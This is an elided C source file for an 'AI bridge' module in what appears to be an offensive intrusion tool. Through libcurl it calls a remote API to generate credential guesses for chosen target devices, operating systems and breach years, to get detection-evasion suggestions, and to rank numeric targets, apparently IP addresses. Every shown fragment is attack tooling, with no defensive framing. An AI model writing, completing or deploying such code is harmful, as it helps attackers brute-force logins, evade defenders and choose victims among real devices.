 ...
 * It handles credential generation, evasion techniques, and ML-based
 * optimizations.
 */
...
static size_t http_write_callback(void *contents, size_t size, size_t nmemb,
                                  void *userp);
static int ai_bridge_http_post(const char *endpoint, const char *json_data,
...
int ai_bridge_init(const char *api_endpoint) {
  ...
  strncpy(g_ai_config.api_endpoint, api_endpoint,
          sizeof(g_ai_config.api_endpoint) - 1);
...
int ai_bridge_generate_credentials(ai_credential_request_t *request,
  ...
  json_object_object_add(jreq, "target_device",
                         json_object_new_string(request->target_device));
  json_object_object_add(jreq, "target_os",
                         json_object_new_string(request->target_os));
  json_object_object_add(jreq, "breach_year_start",
                         json_object_new_int(request->breach_year_start));
  json_object_object_add(jreq, "breach_year_end",
                         json_object_new_int(request->breach_year_end));
  json_object_object_add(jreq, "max_credentials",
                         json_object_new_int(max_credentials));
...
#pragma GCC diagnostic ignored "-Wformat-truncation"
  snprintf(endpoint, sizeof(endpoint), "%s/api/credentials/generate",
           g_ai_config.api_endpoint);
#pragma GCC diagnostic pop
  ...
  for (size_t i = 0; i < count; i++) {
    ...
    if (juser && jpass) {
      ...
      credentials[i].confidence_score =
          jconf ? json_object_get_double(jconf) : 0.5f;
      if (jsrc) {
...
int ai_bridge_get_evasion_techniques(const char *current_pattern,
  ...
  // Build JSON request
  json_object *jreq = json_object_new_object();
  json_object_object_add(jreq, "current_pattern",
                         json_object_new_string(current_pattern));
  json_object_object_add(jreq, "max_suggestions",
                         json_object_new_int(max_suggestions));
...
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wformat-truncation"
  snprintf(endpoint, sizeof(endpoint), "%s/api/evasion/suggest",
           g_ai_config.api_endpoint);
#pragma GCC diagnostic pop
...
int ai_bridge_prioritize_targets(uint32_t *targets, size_t target_count,
                                 float *scores) {
  if (!g_ai_config.initialized) {
    log_error("AI bridge not initialized");
    return -1;
...
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wformat-truncation"
  snprintf(endpoint, sizeof(endpoint), "%s/api/targets/prioritize",
           g_ai_config.api_endpoint);
#pragma GCC diagnostic pop
...
static int ai_bridge_http_post(const char *endpoint, const char *json_data,
  ...
  curl_easy_setopt(g_ai_config.curl, CURLOPT_WRITEFUNCTION,
                   http_write_callback);
  curl_easy_setopt(g_ai_config.curl, CURLOPT_WRITEDATA, (void *)response);
  curl_easy_setopt(g_ai_config.curl, CURLOPT_TIMEOUT_MS,
                   g_ai_config.timeout_ms);
